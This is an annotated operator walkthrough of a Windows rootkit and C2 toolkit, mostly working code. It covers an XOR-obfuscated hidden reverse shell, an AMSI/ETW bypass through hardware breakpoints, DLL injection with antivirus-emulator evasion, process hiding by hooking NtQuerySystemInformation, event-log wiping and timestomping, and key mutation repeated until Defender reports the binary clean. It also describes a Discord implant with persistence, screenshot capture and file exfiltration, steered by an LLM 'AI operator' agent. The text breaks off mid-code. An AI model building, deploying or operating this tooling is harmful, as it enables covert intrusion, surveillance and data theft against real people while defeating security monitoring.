@@ -1,0 +1,853 @@
+# VADER Rootkit — Annotated Code Walkthrough
+
+Operator-level code tour of every critical VADER component. This covers the *how* — specific techniques, byte patterns, and design decisions at the source level.
+
+---
+
+## 1. Reverse Shell — `shell/vader_shell_live.c`
+
+**Purpose:** XOR-encrypted reverse shell with persistent reconnect. Spawns `cmd.exe` with stdin/stdout/stderr bound to a socket.
+
+**Key technique:** All sensitive strings (C2 IP, command name) are XOR-encoded at compile time and decoded on the stack at runtime. The socket handle is cast directly to `HANDLE` and used as the process's standard I/O, so every byte the remote operator sends goes straight to `cmd.exe`, and every byte `cmd.exe` outputs goes straight back over the wire.
+
+```c
+static const unsigned char xCmd[] = {
+    0x22, 0x2C, 0x25, 0x6F, 0x24, 0x39, 0x24  /* "cmd.exe" XOR 0x41 */
+};
+
+static void XorDecode(unsigned char *buf, int len) {
+    int i;
+    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
+}
+
+static void SpawnShell(SOCKET sock) {
+    STARTUPINFOA si;
+    unsigned char cmd[8];
+    memcpy(cmd, xCmd, sizeof(xCmd));
+    XorDecode(cmd, xCmd_LEN);
+    cmd[xCmd_LEN] = 0;
+
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput  = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError  = (HANDLE)sock;
+
+    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE,
+                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+}
+```
+
+**Why it matters:** The Winsock socket handle *is* a valid kernel handle on Windows — `CreateProcessA` accepts it directly as `hStdInput/Output/Error`. No pipe plumbing, no read/write loops. The shell I/O goes kernel-to-kernel. `CREATE_NO_WINDOW` + `SW_HIDE` means no visible window. `MAX_RETRIES=0` means infinite reconnect — if the C2 drops, the shell reconnects every 5 seconds forever. XOR key `0x41` means no plaintext `cmd.exe` or IP address appears in the binary.
+
+---
+
+## 2. AMSI+ETW Hardware Breakpoint Bypass — `dark_room/dark_room_annotated.c`
+
+**Purpose:** Blind both AMSI (script scanning) and ETW (process telemetry) using hardware breakpoints. Zero bytes modified in memory. Zero `VirtualProtect` calls. Invisible to integrity checks.
+
+**Key technique:** A Vectored Exception Handler (VEH) is registered. Debug registers DR0 and DR1 are pointed at `AmsiScanBuffer` and `EtwEventWrite` respectively. When either function is called, the CPU fires `EXCEPTION_SINGLE_STEP` *before the first instruction executes*. The VEH handler intercepts the exception, sets the return value in RAX, pops the return address from the stack, and resumes — the function never executes a single instruction of its own code.
+
+```c
+static LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS pExInfo) {
+    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    /* AMSI bypass: return E_INVALIDARG */
+    if ((void *)pExInfo->ContextRecord->Rip == g_pAmsiScanBuffer) {
+        pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
+        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
+        pExInfo->ContextRecord->Rsp += 8;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    /* ETW bypass: return STATUS_SUCCESS */
+    if ((void *)pExInfo->ContextRecord->Rip == g_pEtwEventWrite) {
+        pExInfo->ContextRecord->Rax = 0;
+        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
+        pExInfo->ContextRecord->Rsp += 8;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+```
+
+The DR7 register encoding sets both breakpoints as execution breakpoints, 1-byte length:
+
+```c
+ctx.Dr0 = (DWORD64)pAmsi;
+ctx.Dr1 = (DWORD64)pEtw;
+ctx.Dr7 &= ~(0xFULL << 16);  /* Clear DR0 cond+len */
+ctx.Dr7 &= ~(0xFULL << 20);  /* Clear DR1 cond+len */
+ctx.Dr7 |= (1 << 0);          /* Enable DR0 locally */
+ctx.Dr7 |= (1 << 2);          /* Enable DR1 locally */
+```
+
+**Why it matters:** The "return address pop" trick (`RIP = *RSP; RSP += 8`) simulates a `ret` instruction without actually executing one. The function's code is never touched — `amsi.dll` and `ntdll.dll` checksums remain valid. No `VirtualProtect` is called so no `EtwTi` (kernel ETW threat intelligence) event fires. Defender's tamper protection doesn't detect it because there's literally nothing to detect — the bypass lives in CPU debug registers, not in modified memory.
+
+---
+
+## 3. Process Injector — `injection/vader_inject.c`
+
+**Purpose:** Inject the VADER DLL into a target process. Supports two modes: `--spawn` (create a suspended process and inject before it runs) or PID mode (inject into an already-running process).
+
+**Key technique:** All Win32 API function names are XOR-encoded and resolved dynamically via `GetProcAddress` at runtime. This keeps `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` out of the IAT — the v1 build got caught by Defender specifically because those imports were visible in the import table.
+
+```c
+static void xd(unsigned char *buf, const unsigned char *enc, int len) {
+    int i;
+    for (i = 0; i < len; i++) buf[i] = enc[i] ^ XK;
+    buf[len] = 0;
+}
+
+/* Volatile zero — prevents compiler from optimizing out the wipe */
+static void sz(void *p, int len) {
+    volatile char *v = (volatile char *)p;
+    int i;
+    for (i = 0; i < len; i++) v[i] = 0;
+}
+
+#define R(var, enc, elen) do { \
+    xd((unsigned char*)buf, enc, elen); \
+    var = (void*)GetProcAddress(hK, buf); \
+    sz(buf, sizeof(buf)); \
+} while(0)
+
+R(pVAE,  xVirtualAllocEx, xVirtualAllocEx_LEN);
+R(pWPM,  xWriteProcessMemory, xWriteProcessMemory_LEN);
+R(pCRT,  xCreateRemoteThread, xCreateRemoteThread_LEN);
+```
+
+The CREATE_SUSPENDED injection flow:
+
+```c
+static BOOL spawn_and_inject(const char *dllPath) {
+    /* 1. Spawn target process suspended */
+    pCPA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
+         CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+    /* 2. Inject DLL while target is frozen */
+    inject_and_watch(pi.hProcess, pi.dwProcessId, dllPath);
+
+    /* 3. Resume — target runs with DLL already loaded */
+    pRT(pi.hThread);
+}
+```
+
+After injection, the injector calculates the remote addresses of `VdrInit` and `VdrWatch` exports by computing the offset between the local and remote base addresses, then calls them via `CreateRemoteThread`.
+
+**Why it matters:** `CREATE_SUSPENDED` guarantees the DLL is loaded before the target executes a single instruction. AMSI and ETW can be blinded before PowerShell's initialization code even runs. The `sz()` function uses `volatile` to prevent the compiler from optimizing away the zeroing of decoded strings — a common mistake in evasion code.
+
+---
+
+## 4. Injection DLL — `injection/vader_inject_dll_annotated.c`
+
+**Purpose:** DLL payload that arms HWBP on ALL threads in the target process. Unlike `dark_room.exe` which only blinds its own thread, this DLL blinds every thread — including threads that spawn later.
+
+**Key technique:** DllMain is a deliberate no-op. All initialization is deferred to the exported `VdrInit` function, which the injector calls via a separate `CreateRemoteThread`. This defeats Defender's emulator, which enters at `DllMain(DLL_PROCESS_ATTACH)` and follows the code flow — it finds nothing and times out. The real work happens in `VdrInit`, which the emulator never follows.
+
+```c
+/* DllMain — NO-OP. Defender's emulator enters here. Finds nothing. */
+BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH)
+        DisableThreadLibraryCalls(hDll);
+    return TRUE;
+}
+
+/* Real init — called via CreateRemoteThread AFTER DllMain returns */
+__declspec(dllexport) DWORD WINAPI VdrInit(LPVOID lpParam) {
+    /* SithStalker: resolve indirect syscall SSNs */
+    gateCount = gate_init(&g_gate);
+    if (gateCount >= 6) g_gateReady = TRUE;
+
+    /* Resolve targets, register VEH, blind all threads */
+    g_pAmsiScanBuffer = resolve_function(...);
+    g_pEtwEventWrite  = resolve_function(...);
+    AddVectoredExceptionHandler(1, InjectHandler);
+    set_hwbp_on_thread(GetCurrentThread());
+    blind_all_threads(g_dwOwnerPid, myTid);
+}
+```
+
+The thread enumeration uses Toolhelp32 snapshots and, when SithStalker gates are available, indirect syscalls for `NtOpenThread`, `NtSuspendThread`, `NtSetContextThread`, and `NtResumeThread` — bypassing any EDR user-mode hooks on those functions:
+
+```c
+if (g_gateReady) {
+    SetSyscall(g_gate.NtOpenThread.ssn, g_gate.NtOpenThread.syscall_addr);
+    status = ((NTSTATUS(__stdcall *)(PHANDLE, ACCESS_MASK,
+        SS_OBJECT_ATTRIBUTES *, SS_CLIENT_ID *))IndirectSyscall)(
+        &hThread, THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
+        &oa, &cid);
+}
+```
+
+The `VdrWatch` export is a watchdog that runs every 2 seconds, re-enumerating threads and setting HWBP on any new ones. PowerShell spawns threads for tab completion, background jobs, and runspace pools — without the watchdog, those threads would bypass AMSI.
+
+**Why it matters:** The emulator evasion is elegant — there's nothing to detect at scan time. `DllMain` does nothing suspicious, and the emulator has no way to know that `VdrInit` will be called later by a remote thread. The indirect syscall path (SithStalker) means that even if an EDR hooks `NtSetContextThread` in user mode, the HWBP setting bypasses it entirely by going straight to the kernel.
+
+---
+
+## 5. Inline Hook Engine — `cloak/hook_engine.c`
+
+**Purpose:** x64 inline hooking engine. Overwrites the first N bytes of a target function with an absolute JMP to the hook, and creates a trampoline that preserves the original bytes so the hook can call the real function.
+
+**Key technique:** 12-byte absolute JMP using `mov rax, imm64; jmp rax`. This is the only x64 JMP that can reach any address in the 64-bit address space without a register reservation or relative offset calculation.
+
+```c
+void hook_write_jmp(BYTE *dst, void *target) {
+    dst[0] = 0x48;                          /* REX.W prefix */
+    dst[1] = 0xB8;                          /* mov rax, imm64 */
+    *(UINT64 *)(dst + 2) = (UINT64)target;  /* 8-byte absolute address */
+    dst[10] = 0xFF;                         /* jmp rax */
+    dst[11] = 0xE0;
+}
+```
+
+Two trampoline modes handle different function types:
+
+```c
+if (h->self_contained)
+    tramp_size = h->save_size;   /* Full NT stub copy — no JMP back */
+else
+    tramp_size = h->save_size + HOOK_PATCH_SIZE;  /* Saved bytes + JMP back */
+
+BYTE *tramp = (BYTE *)VirtualAlloc(
+    NULL, tramp_size, MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE
+);
+memcpy(tramp, h->saved_bytes, h->save_size);
+
+if (!h->self_contained)
+    hook_write_jmp(tramp + h->save_size, (BYTE *)h->target + h->save_size);
+```
+
+**Why it matters:** The `self_contained` flag exists because of Windows 11 Build 26200+, which rejects mid-function entry into ntdll syscall stubs. For NT functions (like `NtQuerySystemInformation`), the entire 24-byte stub — including the `syscall` instruction and `ret` — is copied into the trampoline. The trampoline IS the complete syscall stub and doesn't need to JMP back into ntdll. For non-NT functions (iphlpapi etc), the trampoline saves the overwritten bytes and JMPs back to `target+N` to continue execution. Any bytes between the 12-byte patch and the `save_size` boundary are NOP-filled (`0x90`).
+
+---
+
+## 6. Process Hiding — `cloak/hide_process.c`
+
+**Purpose:** Hook `NtQuerySystemInformation` to unlink VADER processes from the process list. Task Manager, `tasklist.exe`, and any tool using this API won't see them.
+
+**Key technique:** When `SystemProcessInformation` (class 5) is queried, the hook calls the original function via the trampoline, then walks the returned `SYSTEM_PROCESS_INFORMATION` linked list. The list is a chain of variable-size entries connected by `NextEntryOffset`. Hiding a process means either adjusting `prev->NextEntryOffset` to skip over the hidden entry, or (for the first entry) `memmove`-ing the remainder of the buffer forward.
+
+```c
+static NTSTATUS NTAPI hook_NtQuerySystemInformation(
+    ULONG SystemInformationClass, PVOID SystemInformation,
+    ULONG SystemInformationLength, PULONG ReturnLength
+) {
+    /* Call the real function via trampoline */
+    pfnNtQuerySystemInformation orig =
+        (pfnNtQuerySystemInformation)g_hook_nqsi.trampoline;
+    NTSTATUS status = orig(SystemInformationClass, SystemInformation,
+                           SystemInformationLength, ReturnLength);
+
+    if (status != 0 || SystemInformationClass != SystemProcessInformation)
+        return status;
+
+    SYSTEM_PROCESS_INFO *prev = NULL;
+    SYSTEM_PROCESS_INFO *curr = (SYSTEM_PROCESS_INFO *)SystemInformation;
+
+    for (;;) {
+        if (should_hide_process(&curr->ImageName)) {
+            if (prev)
+                prev->NextEntryOffset += curr->NextEntryOffset;
+            else {
+                /* First entry — shift buffer forward */
+                ULONG shift = curr->NextEntryOffset;
+                ULONG remaining = dataSize - offset - shift;
+                memmove(curr, (BYTE *)curr + shift, remaining);
+                if (ReturnLength) *ReturnLength -= shift;
+                continue;  /* Re-check same position */
+            }
+        } else {
+            prev = curr;
+        }
+        if (curr->NextEntryOffset == 0) break;
+        curr = (SYSTEM_PROCESS_INFO *)((BYTE *)curr + curr->NextEntryOffset);
+    }
+    return status;
+}
+```
+
+The hook is installed with `self_contained=TRUE` and `save_size=24` — the full NT stub is copied into the trampoline:
+
+```c
+g_hook_nqsi.target         = GetProcAddress(ntdll, "NtQuerySystemInformation");
+g_hook_nqsi.hook           = hook_NtQuerySystemInformation;
+g_hook_nqsi.save_size      = 24;   /* full NT stub incl. syscall+ret */
+g_hook_nqsi.self_contained = TRUE;
+```
+
+**Why it matters:** The hidden process list is defined in `cloak.h` — a NULL-terminated array of wide strings matched case-insensitively. The `continue` after `memmove` is critical: when the first entry is hidden, the buffer shifts forward and the new first entry needs to be checked at the same pointer position. The `ReturnLength` adjustment prevents callers from reading past the shortened buffer.
+
+---
+
+## 7. Anti-Forensics Cleanup — `forensics/vader_clean_annotated.c`
+
+**Purpose:** Post-operation evidence destruction. Five phases: canary file deletion, event log clearing, prefetch cleanup, timestomping, and self-deletion.
+
+**Key technique:** All file paths, event log channel names, and API names are XOR-encoded (key `0x93`, callsign JULIET). The tool checks privilege level at startup — SYSTEM and admin get full cleanup; standard users get canary deletion only (canaries are in `C:\Windows\Temp`, which is world-writable).
+
+Phase 1 — Canary deletion iterates a table of XOR-encoded paths:
+
+```c
+CanaryEntry canaries[] = {
+    { xCanarySvc,     sizeof(xCanarySvc),     "V4 DELTA svc_health.log" },
+    { xCanaryVer,     sizeof(xCanaryVer),     "V5 ECHO ver_cache.log" },
+    { xCanaryHwmon,   sizeof(xCanaryHwmon),   "V6 FOXTROT hwmon_diag.log" },
+    { xCanaryOsp,     sizeof(xCanaryOsp),     "V7 GOLF osp_telemetry.log" },
+    { xCanaryInject,  sizeof(xCanaryInject),  "Phase4 HOTEL inject_status" },
+    { xCanaryStager,  sizeof(xCanaryStager),  "Stager INDIA stager_canary" },
+};
+```
+
+Phase 2 — Event log clearing dynamically resolves `wevtapi.dll!EvtClearLog` to avoid static import signatures, then clears PowerShell/Operational, Sysmon/Operational, Security, and Application logs.
+
+Phase 4 — Timestomping reads creation/access/write times from `kernel32.dll` (a file that's existed since Windows NT) and applies them to the target file:
+
+```c
+HANDLE hRef = CreateFileA(kernel32_path, GENERIC_READ, ...);
+GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);
+
+HANDLE hTarget = CreateFileA(targetPath, FILE_WRITE_ATTRIBUTES, ...);
+SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
+```
+
+Phase 5 — Self-deletion uses `MoveFileExA` with `MOVEFILE_DELAY_UNTIL_REBOOT` to schedule the binary for deletion on next reboot (can't delete a running executable).
+
+**Why it matters:** The cleanup tool writes its own evidence log to `C:\Windows\Temp\vader_clean_log.txt` (tagged `[J]` for JULIET) so the operator can verify what was cleaned. Each VADER component uses a different XOR key and NATO callsign — DELTA, ECHO, FOXTROT, GOLF, HOTEL, INDIA, JULIET — so a compromise of one key doesn't decrypt strings from other components.
+
+---
+
+## 8. XOR Mutation Pipeline — `mutate.py`
+
+**Purpose:** Rotate XOR keys across all VADER components. For each component: generate a new random key, re-encode every XOR array in the source, recompile, and scan against Defender. If detected, rotate again (up to 10 attempts). Backs up source before mutation and restores on failure.
+
+**Key technique:** The pipeline parses C source files with regex to find `#define XOR_KEY`, all `static const unsigned char` arrays, and inline `buf[i] ^= 0xNN` patterns. It decodes each array with the old key, re-encodes with the new key, and rewrites the source file.
+
+```python
+def re_encode_array(raw_bytes, old_key, new_key):
+    plaintext = [(b ^ old_key) & 0xFF for b in raw_bytes]
+    return [(b ^ new_key) & 0xFF for b in plaintext]
+
+def gen_new_key(current_key):
+    while True:
+        k = secrets.randbelow(0x7F) + 0x80  # Range 0x80-0xFF
+        if k != current_key:
+            return k
+```
+
+The rotation loop — mutate, compile, scan, retry if detected:
+
+```python
+for attempt in range(1, MAX_ATTEMPTS + 1):
+    old_key, new_key = mutate_source(comp["source"], comp["key_define"])
+    if not compile_component(comp):
+        # Restore backup and bail
+        with open(comp["source"], "w") as f: f.write(backup)
+        return False
+
+    scan_result = scan_binary(binary_path)
+    if scan_result == "CLEAN":
+        return True
+    elif scan_result == "DETECTED":
+        continue  # Try another key
+```
+
+Each component has its own config entry defining source path, output directory, compile flags, key define name, and decode function pattern:
+
+```python
+COMPONENTS = {
+    "dark_room": {
+        "source": "dark_room/dark_room_annotated.c",
+        "key_define": "XOR_KEY",
+        "decode_fn_pattern": "xor_decode",
+        "compile_flags": "/Fe:dark_room.exe /O1 /GS-",
+        ...
+    },
+    # ... 7 more components
+}
+```
+
+**Why it matters:** New keys are generated in the range `0x80-0xFF` — high-byte range avoids producing NULL bytes in encoded arrays (which would break string handling). The `secrets` module provides cryptographically secure randomness. The scan uses `MpCmdRun.exe -Scan -ScanType 3 -DisableRemediation` to test against Defender without quarantining the binary. The backup-and-restore pattern means a failed mutation never leaves the source in a broken state.
+
+---
+
+## 9. HTTP Payload Server — `stagers/vader_serve.py`
+
+**Purpose:** Minimal HTTP server that maps clean URL paths to VADER payloads on disk. The stager binary downloads from these endpoints.
+
+**Key technique:** URL-to-file mapping with streaming delivery. No directory listing, no path traversal — only whitelisted endpoints return data.
+
+```python
+PAYLOAD_MAP = {
+    "/dark_room":   "dark_room/dark_room.exe",
+    "/inject_dll":  "injection/vader_inject.dll",
+    "/inject_exe":  "injection/vader_inject.exe",
+    "/shell":       "shell/vader_shell.exe",
+    "/persist":     "vectors/v7_phantom_dll/osppc.dll",
+}
+
+def do_GET(self):
+    path = self.path.split("?")[0]
+    if path not in PAYLOAD_MAP:
+        self.send_response(404)
+        return
+    file_path = os.path.join(ROOT_DIR, PAYLOAD_MAP[path])
+    # Stream in 8KB chunks
+    with open(file_path, "rb") as f:
+        while True:
+            chunk = f.read(8192)
+            if not chunk: break
+            self.wfile.write(chunk)
+```
+
+Also supports `POST /recon` for implant data exfiltration — incoming data is written to timestamped files in `recon/implant_uploads/`. HEAD requests let the stager probe payload availability before downloading.
+
+**Why it matters:** The 8KB chunked streaming means large payloads don't get loaded into memory all at once. The `Content-Disposition` header makes the download look like a legitimate file download to network monitors. Endpoints are generic enough (`/dark_room`, `/shell`) that they don't immediately flag as malicious in HTTP logs — compared to something like `/vader_rootkit_payload.exe`.
+
+---
+
+## 10. Deployment Orchestrator — `deploy.py`
+
+**Purpose:** Master automation script. Chains: recon, compile, scan, dark room activation, vector selection, deployment, canary monitoring, C2 listener launch, and evidence collection.
+
+**Key technique:** Target profiles define per-target constraints (admin locked, Defender on, excluded vectors). Auto-selection scores vectors based on recon findings and profile preferences, then picks the highest-scoring viable option.
+
+```python
+PROFILES = {
+    "radon": {
+        "name": "RADON LAPTOP",
+        "admin_locked": True,
+        "defender_on": True,
+        "standard_user": True,
+        "office_installed": True,
+        "preferred_vectors": ["V7", "V6"],
+        "excluded_vectors": ["V4"],
+    },
+}
+
+def auto_select_vector(findings, profile=None):
+    candidates = []
+    if findings.get("office_installed") and "V7" not in excluded:
+        candidates.append(("V7", 90, "Office + writable PATH"))
+    if findings.get("writable_svcs") and "V4" not in excluded:
+        candidates.append(("V4", 80, "Writable SYSTEM svc"))
+    # Preferred vectors get +20 bonus
+    for vid in preferred:
+        for i, (cv, score, reason) in enumerate(candidates):
+            if cv == vid:
+                candidates[i] = (cv, score + 20, reason + " [PREFERRED]")
+    candidates.sort(key=lambda x: x[1], reverse=True)
+    return candidates[0][0] if candidates else None
+```
+
+The full `--pentest` automation chain runs 10 phases sequentially:
+
+1. Load target profile
+2. Compile all components (via `vcvars64.bat`)
+3. Scan all binaries against Defender
+4. Run PowerShell recon script
+5. Auto-select vector from recon findings
+6. Run dark room (AMSI+ETW blind)
+7. Deploy vector (copy payload, trigger execution)
+8. Monitor canary file (poll every 5s, timeout 300s)
+9. Collect evidence (JSON report + canary copy + deploy log)
+10. Start C2 listener if SYSTEM achieved
+
+Canary monitoring polls the vector's canary file until content appears or timeout:
+
+```python
+def monitor_canary(vector_id, timeout=300, interval=5):
+    while (time.time() - start) < timeout:
+        content = check_canary(canary)
+        if content:
+            if "SYSTEM" in content:
+                log_ok("SYSTEM EXECUTION CONFIRMED")
+            return content
+        time.sleep(interval)
+```
+
+**Why it matters:** The pre-deploy scan prevents deploying a binary that Defender will immediately quarantine. If a binary comes back `DETECTED`, the operator is told to run `mutate.py` first. The profile system means the same deploy script works across different targets without modification — constraints like "admin is PIN-locked, no UAC bypass possible" are baked into the profile rather than discovered mid-operation. Evidence collection produces a JSON report with timestamps, scan results, and canary content — structured data for the CSEC engagement write-up.
+
+---
+
+## 8. CHEYANNE — Discord C2 + AI Operator
+
+CHEYANNE is the fork of VADER that adds Discord-based C2 infrastructure and an AI-powered operator agent. The naming is permanent and sacred.
+
+### 8.1 Discord Implant — `agent/discord_implant.py`
+
+**Purpose:** Python-based implant deployed to target via PyInstaller. Communicates over Discord (webhook for upload, bot token for command polling). Compiles to `svchost_update.exe` (~9.4MB).
+
+**Architecture:**
+```
+Target Machine                          Discord                         Operator
+┌─────────────────┐                   ┌──────────┐                 ┌────────────────┐
+│ discord_implant  │ ── heartbeat ──> │  #c2     │ <── poll ────  │ cheyanne_ops   │
+│                  │ ── recon ──────> │ channel  │ ── command ──> │ cheyanne_agent │
+│                  │ ── screenshot ─> │          │                │ vader_menu     │
+│                  │ <── commands ─── │          │                │                │
+└─────────────────┘                   └──────────┘                 └────────────────┘
+```
+
+**Key techniques:**
+
+- **Session ID:** 8-char UUID4 prefix, generated on implant startup. Tracks individual implant instances across restarts.
+- **Heartbeat:** JSON `{"type":"heartbeat","session":"XXXXXXXX","hostname":"NAME"}` posted to webhook every 60s.
+- **Command polling:** Bot token reads last N messages from channel. Matches `{"type":"cmd","session":"SESSION_ID","command":"..."}` against own session ID.
+- **Screenshot (GDI):** Uses ctypes to call Win32 GDI — `GetDC(0)`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `BitBlt`. Captures full screen as BMP, uploads to Discord as file attachment (<8MB).
+- **Persistence:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` registry key.
+- **Compilation:** `pyinstaller --onefile --noconsole discord_implant.py` → `dist_py/svchost_update.exe`.
+
+```python
+# GDI screenshot capture — no PIL, no external libs, pure ctypes
+user32 = ctypes.windll.user32
+gdi32 = ctypes.windll.gdi32
+width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
+height = user32.GetSystemMetrics(1)  # SM_CYSCREEN
+hdc_screen = user32.GetDC(0)
+hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+gdi32.SelectObject(hdc_mem, hbmp)
+gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)  # SRCCOPY
+# Write BMP header + pixel data to temp file, upload via webhook multipart
+```
+
+### 8.2 Operations Module — `cheyanne_ops.py`
+
+**Purpose:** Programmatic Discord C2 API layer. Used by the menu, AI agent, and automation scripts. No Hermes/bot framework needed — talks directly to Discord REST API.
+
+**Functions (low-level):**
+| Function | What It Does |
+|----------|-------------|
+| `_parse_implant_config()` | Reads `WEBHOOK_URL`, `BOT_TOKEN`, `CHANNEL_ID` from `agent/discord_implant.py` source |
+| `_post_webhook(content)` | POST JSON to Discord webhook |
+| `_read_channel(limit)` | GET last N messages from channel via Bot token |
+| `send_command(session_id, cmd)` | Post JSON command for specific session |
+| `get_sessions()` | Parse heartbeat/recon messages → active session map |
+| `poll_output(session_id, timeout)` | Wait for `type:output` response from target |
+| `poll_attachment(timeout)` | Wait for file attachment (screenshot, exfil) |
+| `download_url(url, path)` | Download Discord CDN attachment to local file |
+| `convert_bmp_to_png(bmp_path)` | PowerShell .NET System.Drawing conversion |
+
+**High-level ops (menu + agent):**
+| Function | Operation |
+|----------|-----------|
+| `op_sessions()` | List all active sessions with formatted table |
+| `op_screenshot(session_id)` | Send SCREENSHOT → poll attachment → download → convert → open |
+| `op_browse(session_id, path)` | Send `dir /b` command → poll text output |
+| `op_exfil(session_id, remote_path)` | Send UPLOAD command → poll file attachment → save locally |
+| `op_upload(session_id, local_path, remote_path)` | Spin HTTP server → send DOWNLOAD command → target pulls file |
+| `op_recon(session_id)` | Send RECON → poll full system enumeration |
+| `op_run_cmd(session_id, cmd)` | Send arbitrary shell command → poll output |
+
+**Config parsing:** Reads credentials directly from the implant Python source — no separate config file needed. Falls back gracefully if implant source missing.
+
+### 8.3 AI Agent (HANDLER) — `cheyanne_agent.py`
+
+**Purpose:** Natural language C2 operator. Talk to it like a human, it calls tools automatically. Dual backend: local Ollama or Claude API.
+
+**Architecture:**
+```
+Operator types: "take a screenshot of radon"
+        │
+        ▼
+   ┌─────────────┐
+   │   HANDLER    │
+   │  LLM Backend │ ← system prompt with full architecture knowledge
+   │  (Ollama or  │
+   │   Claude)    │
+   └──────┬──────┘
+          │ generates <tool> blocks
+          ▼
+   ┌─────────────┐
+   │ Tool Parser  │ ← regex extracts JSON from <tool>...</tool> tags
+   └──────┬──────┘
+          │ dispatches
+          ▼
+   ┌─────────────┐
+   │  exec_tool() │ → cheyanne_ops.py functions
+   └─────────────┘
+```
+
+**Tool calling approach:** Prompt-based, not native API. The system prompt defines a `<tool>` XML format, and the response parser extracts JSON from these blocks. This works with ANY model regardless of native tool-call support.
+
+```python
+# Example model output:
+# "Let me check the sessions. <tool>{"name":"list_sessions","args":{}}</tool>"
+
+def _parse_tools(self, text):
+    tool_blocks = re.findall(r'<tool>\s*(.*?)\s*</tool>', text, re.DOTALL)
+    calls = []
+    for block in tool_blocks:
+        data = json.loads(block)
+        calls.append((data.get("name", ""), data.get("args", {})))
+    clean = re.sub(r'<tool>.*?</tool>', '', text, flags=re.DOTALL).strip()
+    return calls, clean
+```
+
+**8 available tools:**
+| Tool | Maps To | What It Does |
+|------|---------|-------------|
+| `list_sessions` | `op_sessions()` | List active Discord implant sessions |
+| `screenshot` | `op_screenshot()` | Capture target screen via GDI → Discord |
+| `browse_files` | `op_browse()` | List directory contents on target |
+| `exfil_file` | `op_exfil()` | Pull file from target to operator |
+| `upload_file` | `op_upload()` | Push file to target via HTTP staging |
+| `run_command` | `op_run_cmd()` | Execute shell command on target |
+| `recon` | `op_recon()` | Full system enumeration |
+| `local_command` | `subprocess.run()` | Run command on operator's machine |
+
+**Ollama auto-detection:** Tries `127.0.0.1:11434`, `192.168.1.92:11434`, `localhost:11434` — picks first that responds.
+
+**Multi-round execution:** Up to 3 tool-call rounds per user message. Model calls tools → results fed back → model analyzes → may call more tools → final text response.
+
+### 8.4 Auto-Deploy Pipeline — `auto_screenshot_test.py`
+
+**Purpose:** Automated 7-step pipeline: compile → scan → serve → deploy → discover session → screenshot → convert.
+
+**Steps:**
+1. PyInstaller compile `discord_implant.py` → `svchost_update.exe`
+2. Defender scan the output
+3. HTTP server on `:8890` serving the exe
+4. TCP listener on `:4443` for Radon shell, sends PowerShell download cradle
+5. Discover implant session ID from Discord heartbeat/recon messages
+6. Send SCREENSHOT command, poll for BMP attachment
+7. Download BMP, convert to PNG via .NET, open in explorer
+
+### 8.5 Menu Structure — `vader_menu.py`
+
+The menu is organized into operational phases:
+
+```
+╔═══════════════════════════════════════════════════════╗
+║             C H E Y A N N E                           ║
+╚═══════════════════════════════════════════════════════╝
+
+  PHASE 1 — BUILD
+  [F] Fresh Build          [1] Compile All    [2] Scan All
+  [4] Mutate Keys          [6] Key Status
+
+  PHASE 2 — STEALTH
+  [3] Dark Room Test       [7] Build Cloak    [8] Test Cloak
+  [9] Activate Cloak
+
+  PHASE 3 — DEPLOY
+  [D] C2 Shell (TCP+Discord)
+  [B] Build Discord Implant (PyInstaller)
+  [A] Auto Deploy (compile → serve → deploy → screenshot)
+
+  PHASE 4 — OPERATE
+  [S] Sessions             [T] Screenshot     [L] Browse Files
+  [E] Exfil File           [U] Upload File    [N] Recon
+
+  ── TOOLKIT ──
+  [H] HANDLER (AI Operator)
+  [G] Ghost Encoder        [5] Pentest Chain
+  [W] Web Dashboard        [X] Image Convert
+```
+
+Phase 4 OPERATE imports from `cheyanne_ops.py` with graceful fallback (`HAS_OPS` flag). If the module is missing, Phase 4 options print a warning instead of crashing.
+
+---
+
+## 9. TCP C2 v2 — `shell/vader_c2_v2.py`
+
+**Purpose:** Second-generation C2 listener with shortcut commands, HTTP POST-back screenshot/watch, dual-payload deploy, and non-interactive mode for web UI integration.
+
+**Architecture:**
+```
+Target Machine                     Operator Machine
+─────────────                      ─────────────────
+vader_shell.exe ──TCP:4443──────→  vader_c2_v2.py (listener)
+svchost_health.exe ──Discord──→    Discord channel (webhook + bot)
+screenshot POST ──HTTP:8891────→   one-shot receiver → save + open
+watch frames POST ──HTTP:8891──→   receiver → screenshots/watch_latest.jpg
+                                   watch viewer (HTTP:8892) → browser
+```
+
+### 9.1 Shortcut Dispatch
+
+Six shortcuts are registered in `TCP_SHORTCUTS`:
+
+```python
+TCP_SHORTCUTS = {
